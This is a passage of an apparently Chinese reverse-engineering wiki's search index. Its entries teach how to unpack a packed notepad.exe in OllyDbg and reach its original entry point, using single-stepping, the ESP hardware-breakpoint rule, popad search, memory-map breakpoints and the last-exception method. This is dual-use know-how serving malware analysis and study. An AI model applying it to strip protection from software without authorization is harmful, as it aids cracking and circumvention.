\u800c\u4e0d\u662f\u5b8c\u5168\u5730\u4ece\u5934\u5206\u6790\u5230\u5c3e, \u8fd9\u6709\u8fdd\u9006\u5411\u5de5\u7a0b\u7684\u7406\u5ff5.   \u7528Ollydbg\u6253\u5f00\u538b\u7f29\u5305\u5185\u7684Notepad.exe, \u505c\u5728\u4e86\u4e0b\u56fe\u4f4d\u7f6e. \u5165\u53e3\u70b9\u662f\u4e00\u4e2a pushad \u4fdd\u5b58\u6240\u6709\u5bc4\u5b58\u5668\u72b6\u6001\u5230\u6808\u4e2d, \u968f\u540e\u4fbf\u662f\u4e00\u4e2a call \u8c03\u7528\u4f4d\u4e8e 0040D00A \u5904\u7684\u51fd\u6570. \u8c03\u7528\u540e\u4fbf\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 459DD4F7 \u5904, \u4e4b\u540e\u7684 push ebp \u548c retn \u663e\u7136\u6ca1\u6709\u4efb\u4f55\u610f\u4e49. \u50cf\u8fd9\u79cd\u5165\u53e3\u70b9\u9644\u8fd1\u5c31\u662f\u4e00\u4e2a call \u7684\u6211\u4eec\u79f0\u4e3a \u8fd1call , \u5bf9\u4e8e\u8fd1call\u6211\u4eec\u9009\u62e9\u6b65\u8fdb, \u6309\u4e0bF7(\u5f53\u7136\u4f60\u4e5f\u53ea\u80fd\u9009\u62e9\u6b65\u8fdb, \u4e0d\u7136EIP\u5c31\u8dd1\u504f\u7a0b\u5e8f\u505c\u6b62\u4e86).    \u6b65\u8fdb\u540e\u53c8\u662f\u4e00\u4e2a call , \u6211\u4eec\u7ee7\u7eed\u6b65\u8fdb, \u6309F7, \u8ddf\u8fdb\u540e\u53d1\u73b0\u6ca1\u6709\u8fd1call\u4e86, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5728\u8c03 GetModuleHandleA ,  GetProcAddress \u7b49API, \u7ee7\u7eed\u5411\u4e0b\u5206\u6790.    \u4e4b\u540e\u4f1a\u9047\u5230\u591a\u4e2a\u8df3\u8f6c\uff0c\u6211\u4eec\u5c3d\u91cf\u6ee1\u8db3\u5411\u4e0b\u7684\u8df3\u8f6c\uff0c\u5bf9\u4e8e\u5411\u4e0a\u7684\u8df3\u8f6c\u4e0d\u4e88\u5b9e\u73b0\u5e76\u5229\u7528F4\u8df3\u51fa\u5faa\u73af\uff0c\u76f4\u5230 0040D3AF \u5904, \u6211\u4eec\u770b\u4ee5\u4e0b\u7684\u4ee3\u7801  0040 D3AF      61                    popad  0040 D3B0      75   08                 jnz   short   NotePad.0040D3BA  0040 D3B2      B8   01000000           mov   eax , 0x1  0040 D3B7      C2   0 C00               retn   0xC  0040 D3BA      68   CC104000           push   NotePad.004010CC  0040 D3BF      C3                    retn   \u8fd9\u91cc popad \u53ef\u4ee5\u6062\u590d\u5728\u7a0b\u5e8f\u5165\u53e3\u70b9\u5904\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u72b6\u6001, \u7136\u540e jnz \u8df3\u8f6c\u5230 0040D3BA \u5904, \u8fd9\u91cc\u662f\u5229\u7528 push \u548c retn \u6765\u5c06 EIP \u6539\u53d8\u4e3a 004010CC , \u4e5f\u5c31\u662f\u8bf4\u5728\u58f3\u89e3\u538b\u5b8c\u4ee3\u7801\u7b49\u8d44\u6e90\u5b8c\u6bd5\u540e, \u5c06\u901a\u8fc7 jnz \u8df3\u8f6c\u5230 push \u5904, \u7136\u540e\u901a\u8fc7 push \u548c ret \u5c06 EIP \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u539f\u6765\u7684\u5165\u53e3\u70b9(OEP)\u5e76\u8fd4\u56de\u5230OEP\u5904, \u7136\u540e\u7ee7\u7eed\u6267\u884c\u539f\u7a0b\u5e8f\u7684\u4ee3\u7801. \u6211\u4eec\u6267\u884c\u5230 retn \u8fd4\u56de\u540e, \u53ef\u4ee5\u770b\u5230\u5982\u4e0b:   \u663e\u7136, \u6211\u4eec\u5230\u4e86\u4e00\u5806\u88ab Ollydbg \u8bef\u8ba4\u4e3a\u662f\u6570\u636e\u7684\u5730\u65b9\u7ee7\u7eed\u6267\u884c, \u663e\u7136 Ollydbg \u5206\u6790\u9519\u8bef\u4e86, \u6211\u4eec\u9700\u8981\u8ba9 Ollydbg \u91cd\u65b0\u5206\u6790, \u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u9009\u62e9 \u5206\u6790- \u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 , \u6216\u662f\u6309\u4e0b ctrl+a , \u8fd9\u65f6\u6b63\u786e\u5730\u663e\u793a\u51faOEP\u5904\u7684\u6c47\u7f16\u6307\u4ee4.", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/esp/", 
            "text": "ESP\u5b9a\u5f8b\u6cd5\u662f\u8131\u58f3\u7684\u5229\u5668, \u662f\u5e94\u7528\u9891\u7387\u6700\u9ad8\u7684\u8131\u58f3\u65b9\u6cd5\u4e4b\u4e00. \n\n\n\u8981\u70b9\n\n\nESP\u5b9a\u5f8b\u7684\u539f\u7406\u5728\u4e8e\u5229\u7528\u7a0b\u5e8f\u4e2d\u5806\u6808\u5e73\u8861\u6765\u5feb\u901f\u627e\u5230OEP. \n\n\n\u7531\u4e8e\u5728\u7a0b\u5e8f\u81ea\u89e3\u5bc6\u6216\u8005\u81ea\u89e3\u538b\u8fc7\u7a0b\u4e2d, \u4e0d\u5c11\u58f3\u4f1a\u5148\u5c06\u5f53\u524d\u5bc4\u5b58\u5668\u72b6\u6001\u538b\u6808, \u5982\u4f7f\u7528\npushad\n, \u5728\u89e3\u538b\u7ed3\u675f\u540e, \u4f1a\u5c06\u4e4b\u524d\u7684\u5bc4\u5b58\u5668\u503c\u51fa\u6808, \u5982\u4f7f\u7528\npopad\n. \u56e0\u6b64\u5728\u5bc4\u5b58\u5668\u51fa\u6808\u65f6, \u5f80\u5f80\u7a0b\u5e8f\u4ee3\u7801\u88ab\u6062\u590d, \u6b64\u65f6\u786c\u4ef6\u65ad\u70b9\u89e6\u53d1. \u7136\u540e\u5728\u7a0b\u5e8f\u5f53\u524d\u4f4d\u7f6e, \u53ea\u9700\u8981\u5c11\u8bb8\u5355\u6b65\u64cd\u4f5c, \u5c31\u5f88\u5bb9\u6613\u5230\u8fbe\u6b63\u786e\u7684OEP\u4f4d\u7f6e. \n\n\n\n\n\u7a0b\u5e8f\u521a\u8f7d\u5165\u5f00\u59cbpushad/pushfd\n\n\n\u5c06\u5168\u90e8\u5bc4\u5b58\u5668\u538b\u6808\u540e\u5c31\u8bbe\u5bf9ESP\u5bc4\u5b58\u5668\u8bbe\u786c\u4ef6\u65ad\u70b9\n\n\n\u8fd0\u884c\u7a0b\u5e8f, \u89e6\u53d1\u65ad\u70b9\n\n\n\u5220\u9664\u786c\u4ef6\u65ad\u70b9\u5f00\u59cb\u5206\u6790\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n2_esp.zip\n\n\n\u8fd8\u662f\u4e0a\u4e00\u7bc7\u7684\u793a\u4f8b, \u5165\u53e3\u4e00\u53e5\npopad\n, \u6211\u4eec\u6309\u4e0bF8\u6267\u884c\npopad\n\u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001, \u6211\u4eec\u53ef\u4ee5\u5728\u53f3\u8fb9\u7684\u5bc4\u5b58\u5668\u7a97\u53e3\u91cc\u53d1\u73b0\nESP\n\u5bc4\u5b58\u5668\u7684\u503c\u53d8\u4e3a\u4e86\u7ea2\u8272, \u4e5f\u5373\u503c\u53d1\u751f\u4e86\u6539\u53d8. \n\n\n\n\n\u6211\u4eec\u9f20\u6807\u53f3\u51fb\nESP\n\u5bc4\u5b58\u5668\u7684\u503c, \u4e5f\u5c31\u662f\u56fe\u4e2d\u7684\n0019FF64\n, \u9009\u62e9\nHW break[ESP]\n\u540e, \u6309\u4e0b\nF9\n\u8fd0\u884c\u7a0b\u5e8f, \u7a0b\u5e8f\u4f1a\u5728\u89e6\u53d1\u65ad\u70b9\u65f6\u65ad\u4e0b. \u5982\u56fe\u6765\u5230\u4e86\n0040D3B0\n\u7684\u4f4d\u7f6e. \u8fd9\u91cc\u5c31\u662f\u4e0a\u4e00\u7bc7\u6211\u4eec\u5355\u6b65\u8ddf\u8e2a\u65f6\u5230\u8fbe\u7684\u4f4d\u7f6e, \u5269\u4f59\u7684\u5c31\u4e0d\u518d\u8d58\u8ff0.", 
            "title": "ESP \u5b9a\u5f8b\u6cd5"
        }, 
        {
            "location": "/reverse/unpack/esp/#_1", 
            "text": "ESP\u5b9a\u5f8b\u7684\u539f\u7406\u5728\u4e8e\u5229\u7528\u7a0b\u5e8f\u4e2d\u5806\u6808\u5e73\u8861\u6765\u5feb\u901f\u627e\u5230OEP.   \u7531\u4e8e\u5728\u7a0b\u5e8f\u81ea\u89e3\u5bc6\u6216\u8005\u81ea\u89e3\u538b\u8fc7\u7a0b\u4e2d, \u4e0d\u5c11\u58f3\u4f1a\u5148\u5c06\u5f53\u524d\u5bc4\u5b58\u5668\u72b6\u6001\u538b\u6808, \u5982\u4f7f\u7528 pushad , \u5728\u89e3\u538b\u7ed3\u675f\u540e, \u4f1a\u5c06\u4e4b\u524d\u7684\u5bc4\u5b58\u5668\u503c\u51fa\u6808, \u5982\u4f7f\u7528 popad . \u56e0\u6b64\u5728\u5bc4\u5b58\u5668\u51fa\u6808\u65f6, \u5f80\u5f80\u7a0b\u5e8f\u4ee3\u7801\u88ab\u6062\u590d, \u6b64\u65f6\u786c\u4ef6\u65ad\u70b9\u89e6\u53d1. \u7136\u540e\u5728\u7a0b\u5e8f\u5f53\u524d\u4f4d\u7f6e, \u53ea\u9700\u8981\u5c11\u8bb8\u5355\u6b65\u64cd\u4f5c, \u5c31\u5f88\u5bb9\u6613\u5230\u8fbe\u6b63\u786e\u7684OEP\u4f4d\u7f6e.    \u7a0b\u5e8f\u521a\u8f7d\u5165\u5f00\u59cbpushad/pushfd  \u5c06\u5168\u90e8\u5bc4\u5b58\u5668\u538b\u6808\u540e\u5c31\u8bbe\u5bf9ESP\u5bc4\u5b58\u5668\u8bbe\u786c\u4ef6\u65ad\u70b9  \u8fd0\u884c\u7a0b\u5e8f, \u89e6\u53d1\u65ad\u70b9  \u5220\u9664\u786c\u4ef6\u65ad\u70b9\u5f00\u59cb\u5206\u6790", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/esp/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  2_esp.zip  \u8fd8\u662f\u4e0a\u4e00\u7bc7\u7684\u793a\u4f8b, \u5165\u53e3\u4e00\u53e5 popad , \u6211\u4eec\u6309\u4e0bF8\u6267\u884c popad \u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001, \u6211\u4eec\u53ef\u4ee5\u5728\u53f3\u8fb9\u7684\u5bc4\u5b58\u5668\u7a97\u53e3\u91cc\u53d1\u73b0 ESP \u5bc4\u5b58\u5668\u7684\u503c\u53d8\u4e3a\u4e86\u7ea2\u8272, \u4e5f\u5373\u503c\u53d1\u751f\u4e86\u6539\u53d8.    \u6211\u4eec\u9f20\u6807\u53f3\u51fb ESP \u5bc4\u5b58\u5668\u7684\u503c, \u4e5f\u5c31\u662f\u56fe\u4e2d\u7684 0019FF64 , \u9009\u62e9 HW break[ESP] \u540e, \u6309\u4e0b F9 \u8fd0\u884c\u7a0b\u5e8f, \u7a0b\u5e8f\u4f1a\u5728\u89e6\u53d1\u65ad\u70b9\u65f6\u65ad\u4e0b. \u5982\u56fe\u6765\u5230\u4e86 0040D3B0 \u7684\u4f4d\u7f6e. \u8fd9\u91cc\u5c31\u662f\u4e0a\u4e00\u7bc7\u6211\u4eec\u5355\u6b65\u8ddf\u8e2a\u65f6\u5230\u8fbe\u7684\u4f4d\u7f6e, \u5269\u4f59\u7684\u5c31\u4e0d\u518d\u8d58\u8ff0.", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/direct-oep/", 
            "text": "\u6240\u8c13\u7684\u4e00\u6b65\u5230\u8fbeOEP\u7684\u8131\u58f3\u65b9\u6cd5, \u662f\u6839\u636e\u6240\u8131\u58f3\u7684\u7279\u5f81, \u5bfb\u627e\u5176\u8ddd\u79bbOEP\u6700\u8fd1\u7684\u4e00\u5904\u6c47\u7f16\u6307\u4ee4, \u7136\u540e\u4e0bint3\u65ad\u70b9, \u5728\u7a0b\u5e8f\u8d70\u5230OEP\u7684\u65f6\u5019dump\u7a0b\u5e8f.  \n\n\n\u5982\u4e00\u4e9b\u538b\u7f29\u58f3\u5f80\u5f80popad\u6307\u4ee4\u8ddd\u79bbOEP\u6216\u8005\u5927jmp\u7279\u522b\u8fd1, \u56e0\u6b64\u4f7f\u7528Ollydbg\u7684\u641c\u7d22\u529f\u80fd, \u53ef\u4ee5\u641c\u7d22\u58f3\u7684\u7279\u5f81\u6c47\u7f16\u4ee3\u7801, \u8fbe\u5230\u4e00\u6b65\u65ad\u70b9\u5230\u8fbeOEP\u7684\u6548\u679c. \n\n\n\u8981\u70b9\n\n\n\n\nctrl+f \u67e5\u627epopad\n\n\nctrl+l \u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u5339\u914d\u5904\n\n\n\u627e\u5230\u5339\u914d\u5904, \u786e\u8ba4\u662f\u58f3\u89e3\u538b\u5b8c\u6bd5\u5373\u5c06\u8df3\u8f6c\u5230OEP\u90e8\u5206, \u5219\u8bbe\u4e0b\u65ad\u70b9\u8fd0\u884c\u5230\u8be5\u5904\n\n\n\u53ea\u9002\u7528\u4e8e\u6781\u5c11\u6570\u538b\u7f29\u58f3\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n3_direct2oep.zip\n\n\n\u8fd8\u662f\u7528\u7684\u539f\u5148\u7684notepad.exe\u6765\u793a\u4f8b, \u7528\nOllydbg\n\u6253\u5f00\u540e, \u6211\u4eec\u6309\u4e0b\nctrl+f\n\u6765\u67e5\u627e\u6307\u5b9a\u7684\u5b57\u7b26\u4e32, \u50cf\npopad\n\u662f\u5178\u578b\u7684\u4e00\u4e2a\u7279\u5f81, \u6709\u90e8\u5206\u58f3\u5b83\u5c31\u5e38\u7528\npopad\n\u6765\u6062\u590d\u72b6\u6001, \u6240\u4ee5\u5982\u4e0b\u56fe\u6240\u793a\u6765\u641c\u7d22\npopad\n.\n\n\n\n\n\u5728\u672c\u4f8b\u4e2d, \u5f53\u641c\u7d22\u5230\u7684\npopad\n\u4e0d\u7b26\u5408\u6211\u4eec\u7684\u8981\u6c42\u65f6, \u53ef\u4ee5\u6309\u4e0b\nctrl+l\n\u6765\u641c\u7d22\u4e0b\u4e00\u4e2a\u5339\u914d\u5904, \u5927\u6982\u6309\u4e0b\u4e2a\u4e09\u56db\u6b21, \u6211\u4eec\u627e\u5230\u4e86\u8df3\u8f6c\u5230OEP\u7684\u4f4d\u7f6e\u5904.", 
            "title": "\u4e00\u6b65\u5230\u8fbe OEP \u6cd5"
        }, 
        {
            "location": "/reverse/unpack/direct-oep/#_1", 
            "text": "ctrl+f \u67e5\u627epopad  ctrl+l \u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u5339\u914d\u5904  \u627e\u5230\u5339\u914d\u5904, \u786e\u8ba4\u662f\u58f3\u89e3\u538b\u5b8c\u6bd5\u5373\u5c06\u8df3\u8f6c\u5230OEP\u90e8\u5206, \u5219\u8bbe\u4e0b\u65ad\u70b9\u8fd0\u884c\u5230\u8be5\u5904  \u53ea\u9002\u7528\u4e8e\u6781\u5c11\u6570\u538b\u7f29\u58f3", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/direct-oep/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  3_direct2oep.zip  \u8fd8\u662f\u7528\u7684\u539f\u5148\u7684notepad.exe\u6765\u793a\u4f8b, \u7528 Ollydbg \u6253\u5f00\u540e, \u6211\u4eec\u6309\u4e0b ctrl+f \u6765\u67e5\u627e\u6307\u5b9a\u7684\u5b57\u7b26\u4e32, \u50cf popad \u662f\u5178\u578b\u7684\u4e00\u4e2a\u7279\u5f81, \u6709\u90e8\u5206\u58f3\u5b83\u5c31\u5e38\u7528 popad \u6765\u6062\u590d\u72b6\u6001, \u6240\u4ee5\u5982\u4e0b\u56fe\u6240\u793a\u6765\u641c\u7d22 popad .   \u5728\u672c\u4f8b\u4e2d, \u5f53\u641c\u7d22\u5230\u7684 popad \u4e0d\u7b26\u5408\u6211\u4eec\u7684\u8981\u6c42\u65f6, \u53ef\u4ee5\u6309\u4e0b ctrl+l \u6765\u641c\u7d22\u4e0b\u4e00\u4e2a\u5339\u914d\u5904, \u5927\u6982\u6309\u4e0b\u4e2a\u4e09\u56db\u6b21, \u6211\u4eec\u627e\u5230\u4e86\u8df3\u8f6c\u5230OEP\u7684\u4f4d\u7f6e\u5904.", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/memory/", 
            "text": "\u5185\u5b58\u955c\u50cf\u6cd5\u662f\u5728\u52a0\u58f3\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u65f6, \u901a\u8fc7OD\u7684\nALT+M\n\u5feb\u6377\u952e, \u8fdb\u5165\u5230\u7a0b\u5e8f\u865a\u62df\u5185\u5b58\u533a\u6bb5. \u7136\u540e\u901a\u8fc7\u52a0\u4e24\u6b21\u5185\u5b58\u4e00\u6b21\u6027\u65ad\u70b9, \u5230\u8fbe\u7a0b\u5e8f\u6b63\u786eOEP\u7684\u4f4d\u7f6e. \n\n\n\u5185\u5b58\u955c\u50cf\u6cd5\u7684\u539f\u7406\u5728\u4e8e\u5bf9\u4e8e\u7a0b\u5e8f\u8d44\u6e90\u6bb5\u548c\u4ee3\u7801\u6bb5\u4e0b\u65ad\u70b9, \u4e00\u822c\u7a0b\u5e8f\u81ea\u89e3\u538b\u6216\u8005\u81ea\u89e3\u5bc6\u65f6, \u4f1a\u9996\u5148\u8bbf\u95ee\u8d44\u6e90\u6bb5\u83b7\u53d6\u6240\u9700\u8d44\u6e90, \u7136\u540e\u5728\u81ea\u52a8\u8131\u58f3\u5b8c\u6210\u540e, \u8f6c\u56de\u7a0b\u5e8f\u4ee3\u7801\u6bb5. \u8fd9\u65f6\u5019\u4e0b\u5185\u5b58\u4e00\u6b21\u6027\u65ad\u70b9, \u7a0b\u5e8f\u5c31\u4f1a\u505c\u5728OEP\u5904. \n\n\n\u8981\u70b9\n\n\n\n\n\u9009\u62e9\u83dc\u5355\u7684\n\u9009\u9879-\n\u8c03\u8bd5\u9009\u9879-\n\u5f02\u5e38\n\n\n\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38\n\n\n\u6309\u4e0b\nALT+M\n, \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\n.rsrc\n, \u6309F2\u4e0b\u65ad\u70b9, \u7136\u540e\u6309\nSHIFT+F9\n\u8fd0\u884c\u5230\u65ad\u70b9\n\n\n\u518d\u6309\nALT+M\n, \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\n.rsrc\n\u4e0a\u9762\u7684\n.text\n(\u5728\u793a\u4f8b\u4e2d\u662f\n00401000\n\u5904), \u6309F2\u4e0b\u65ad\u70b9. \u7136\u540e\u6309\nSHIFT+F9\n\uff08\u6216\u8005\u662f\u5728\u6ca1\u5f02\u5e38\u60c5\u51b5\u4e0b\u6309F9\uff09\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n4_memory.zip\n\n\nOD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355\u680f\u7684\n\u9009\u9879-\n\u8c03\u8bd5\u8bbe\u7f6e-\n\u5f02\u5e38\u6807\u7b7e\u9875\n\u4e2d\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38\n\n\n\n\n\u6309\u4e0b\nAlt+M\n\u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u8d44\u6e90\u6bb5, \u4e5f\u5c31\u662f\n\u5730\u5740=00407000\n, \n\u5927\u5c0f=00005000\n\u7684\n.rsrc\n\u6bb5, \u9009\u4e2dF2\u4e0b\u65ad\n\n\n\n\n\u56de\u5230CPU\u7a97\u53e3, \u6309\u4e0bF9\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86\n0040D75F\n\u5904\n\n\n\n\n\u518d\u6b21\u6309\u4e0b\nAlt+M\n\u6253\u5f00\u5185\u5b58\u955c\u50cf, \u5bf9\n.text\n\u4ee3\u7801\u6bb5\u4e0b\u65ad\n\n\n\n\n\u518d\u7ee7\u7eed\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86\n004010CC\n\u5904, \u4e5f\u5c31\u662fOEP", 
            "title": "\u5185\u5b58\u955c\u50cf\u6cd5"
        }, 
        {
            "location": "/reverse/unpack/memory/#_1", 
            "text": "\u9009\u62e9\u83dc\u5355\u7684 \u9009\u9879- \u8c03\u8bd5\u9009\u9879- \u5f02\u5e38  \u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38  \u6309\u4e0b ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc , \u6309F2\u4e0b\u65ad\u70b9, \u7136\u540e\u6309 SHIFT+F9 \u8fd0\u884c\u5230\u65ad\u70b9  \u518d\u6309 ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc \u4e0a\u9762\u7684 .text (\u5728\u793a\u4f8b\u4e2d\u662f 00401000 \u5904), \u6309F2\u4e0b\u65ad\u70b9. \u7136\u540e\u6309 SHIFT+F9 \uff08\u6216\u8005\u662f\u5728\u6ca1\u5f02\u5e38\u60c5\u51b5\u4e0b\u6309F9\uff09", 
            "title": "\u8981\u70b9"
        }, 
        {
            "location": "/reverse/unpack/memory/#_2", 
            "text": "\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d:  4_memory.zip  OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355\u680f\u7684 \u9009\u9879- \u8c03\u8bd5\u8bbe\u7f6e- \u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38   \u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u8d44\u6e90\u6bb5, \u4e5f\u5c31\u662f \u5730\u5740=00407000 ,  \u5927\u5c0f=00005000 \u7684 .rsrc \u6bb5, \u9009\u4e2dF2\u4e0b\u65ad   \u56de\u5230CPU\u7a97\u53e3, \u6309\u4e0bF9\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 0040D75F \u5904   \u518d\u6b21\u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u5bf9 .text \u4ee3\u7801\u6bb5\u4e0b\u65ad   \u518d\u7ee7\u7eed\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 004010CC \u5904, \u4e5f\u5c31\u662fOEP", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/reverse/unpack/last-exception/", 
            "text": "\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5\u7684\u539f\u7406\u662f, \u7a0b\u5e8f\u5728\u81ea\u89e3\u538b\u6216\u81ea\u89e3\u5bc6\u8fc7\u7a0b\u4e2d, \u53ef\u80fd\u4f1a\u89e6\u53d1\u65e0\u6570\u6b21\u7684\u5f02\u5e38. \u5982\u679c\u80fd\u5b9a\u4f4d\u5230\u6700\u540e\u4e00\u6b21\u7a0b\u5e8f\u5f02\u5e38\u7684\u4f4d\u7f6e, \u53ef\u80fd\u5c31\u4f1a\u5f88\u63a5\u8fd1\u81ea\u52a8\u8131\u58f3\u5b8c\u6210\u4f4d\u7f6e. \u73b0\u5728\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u6cd5\u8131\u58f3\u53ef\u4ee5\u5229\u7528Ollydbg\u7684\u5f02\u5e38\u8ba1\u6570\u5668\u63d2\u4ef6, \u5148\u8bb0\u5f55\u5f02\u5e38\u6570\u76ee, \u7136\u540e\u91cd\u65b0\u8f7d\u5165, \u81ea\u52a8\u505c\u5728\u6700\u540e\u4e00\u6b21\u5f02\u5e38\u5904. \n\n\n\u8981\u70b9\n\n\n\n\n\u70b9\u51fb\n\u9009\u9879-\n\u8c03\u8bd5\u9009\u9879\u2014\n\u5f02\u5e38\n, \u628a\u91cc\u9762\u7684\u221a\u5168\u90e8\u53bb\u6389! \u6309\u4e0b\nCTRL+F2\n\u91cd\u8f7d\u4e0b\u7a0b\u5e8f\n\n\n\u5f00\u59cb\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u8df3\u8f6c, \u5728\u8fd9\u91cc\u6211\u4eec\u6309\nSHIFT+F9\n, \u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c, \u8bb0\u4e0b\u4ece\u5f00\u59cb\u6309\nSHIFT+F9\n\u5230\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570\nm\n!\n\n\nCTRL+F2\n\u91cd\u8f7d\u7a0b\u5e8f, \u6309\nSHIFT+F9\n(\u8fd9\u6b21\u6309\u7684\u6b21\u6570\u4e3a\u7a0b\u5e8f\u8fd0\u884c\u7684\u6b21\u6570\nm-1\n\u6b21)\n\n\n\u5728OD\u7684\u53f3\u4e0b\u89d2\u6211\u4eec\u770b\u89c1\u6709\u4e00\u4e2a\"\nSE \u53e5\u67c4\n\", \u8fd9\u65f6\u6211\u4eec\u6309\nCTRL+G\n, \u8f93\u5165\nSE \u53e5\u67c4\n\u524d\u7684\u5730\u5740!\n\n\n\u6309F2\u4e0b\u65ad\u70b9!\u7136\u540e\u6309\nSHIFT+F9\n\u6765\u5230\u65ad\u70b9\u5904, F8\u5355\u6b65\u8ddf\u8e2a\n\n\n\n\n\u793a\u4f8b\n\n\n\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: \n5_last_exception.zip\n\n\nOD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355\n\u9009\u9879-\n\u8c03\u8bd5\u8bbe\u7f6e-\n\u5f02\u5e38\u6807\u7b7e\u9875\n\u4e2d\u53d6\u6d88\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38, \u7136\u540e\u91cd\u8f7d\u7a0b\u5e8f.\n\n\n\n\n\u6211\u4eec\u6309\u4e0b\nShift+F9\n, \u8bb0\u5f55\u6309\u4e86\u591a\u5c11\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c. \u6211\u4eec\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u6b21\u6309\u4e0b\u662f\u6309\u4e86\u591a\u5c11\u6b21. \u5728\u672c\u4f8b\u4e2d\n\n\n\n\nshift+F9\n\u4e00\u6b21, \u5230\u4e86\n0040CCD2\n\u7684\u4f4d\u7f6e\n\n\nshift+F9\n\u4e24\u6b21, \u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u91cd\u8f7d\u7a0b\u5e8f, \u53ea\u9700\u6309\u4e0b1\u6b21(\n2-1=1\n)\nShift+F9\n, \u6765\u5230\n0040CCD2\n\u7684\u4f4d\u7f6e, \u89c2\u5bdf\u5806\u6808\u7a97\u53e3, \u8fd9\u91cc\u6709\u4e00\u4e2a\nSE\u5904\u7406\u7a0b\u5e8f: 0040CCD7\n\n\n\n\n\u6211\u4eec\u5728CPU\u7a97\u53e3(\u6c47\u7f16\u6307\u4ee4), \u6309\nCtrl+G\n, \u8f93\u5165\n0040CCD7\n, \u7136\u540e\u5728\u6b64\u5904\u6309\u4e0bF2. \u4e5f\u5c31\u662f\u5728\n0040CCD7\n\u5904\u8bbe\u7f6e\u65ad\u70b9, \u7136\u540e\u6309\u4e0b\nShift+F9\n\u8fd0\u884c, \u89e6\u53d1\u65ad\u70b9.\n\n\n\n\n\u89e6\u53d1\u65ad\u70b9\u540e, \u6765\u5355\u6b65\u8ddf\u8e2a. \u5411\u4e0b\u90fd\u662f\u4e00\u4e9b\u5faa\u73af\u548c\u8df3\u8f6c, \u6211\u4eec\u4f7f\u7528F4\u8df3\u8fc7\u5faa\u73af. \u6700\u540e\u5230\u8fbe\u5982\u4e0b\u4f4d\u7f6e\n\n\n\n\n\u663e\u7136\u5728\u6700\u540e\u7684\nmov ebp, 0041010CC; jmp ebp\n\u662f\u5728\u8df3\u8f6c\u5411OEP, \u6211\u4eec\u8df3\u8f6c\u8fc7\u53bb\u5982\u4e0b\u56fe\u6240\u793a:\n\n\n\n\n\u663e\u7136, 